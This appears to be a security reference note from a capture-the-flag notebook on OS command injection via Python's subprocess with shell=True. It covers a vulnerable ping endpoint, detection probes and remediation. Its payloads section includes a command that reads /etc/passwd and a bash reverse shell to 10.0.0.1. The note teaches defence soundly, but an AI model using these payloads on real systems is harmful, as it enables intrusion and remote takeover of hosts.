'``markdown
# Command Injection via shell=True

**Tags:** `#injection` `#python` `#rce` `#input-validation`

**CWE:** CWE-78 (OS Command Injection)

**OWASP:** A03:2021 – Injection

**Severity:** Critical (CVSS ~8.8)

---

## Description

User-supplied input is interpolated directly into a shell command executed via `subprocess.run()` with `shell=True`, allowing an attacker to chain arbitrary commands using shell metacharacters (`;`, `|`, `&&`, `` ` ``, `$()`).

---

## Vulnerable Pattern

``python
import subprocess

host = request.form.get("host", "").strip()
proc = subprocess.run(
    f"ping -c 1 {host}",
    shell=True,
    capture_output=True,
    text=True,
    timeout=15,
)
``

`shell=True` invokes `/bin/sh` which interprets metacharacters. The user input is concatenated directly with no sanitization.

---

## Attack Payloads

**1. Command chaining with semicolon:**
```
127.0.0.1; id
```
Output: `uid=1001(web) gid=1001(web)`

**2. File read:**
```
127.0.0.1; cat /etc/passwd
```

**3. Reverse shell:**
```
127.0.0.1; bash -c 'exec bash -i &>/dev/tcp/10.0.0.1/4444 <&1'
```

---

## Detection

**Static:** Grep for `shell=True`, `os.system(`, `os.popen(` combined with string formatting (`f""`, `.format()`, `%`).

**Dynamic:** Input `; id`, `| id`, `` `id` ``, `$(id)`, `%0aid` in all user fields.

---

## Remediation

1. Use argument arrays instead of `shell=True`:
   ```python
   subprocess.run(["ping", "-c", "1", validated_host], timeout=15)
   ```
2. Validate input against a strict allowlist (e.g., IP address regex)
3. If shell is unavoidable, escape with `shlex.quote(user_input)`

---

## Rooms Seen

| Room | Context | Date |
|------|---------|------|
| Infinity Pool (Hacker Holidays 2026) | `/internal/netcheck` ping endpoint — `subprocess.run(f"ping -c 1 {host}", shell=True)` | Aug 2026 |

---

## Related

- Command Injection in Automation Worker — same room, same pattern but running as root on port 9000
- Loopback Service Without Authentication — how we pivoted from this shell to internal services
```
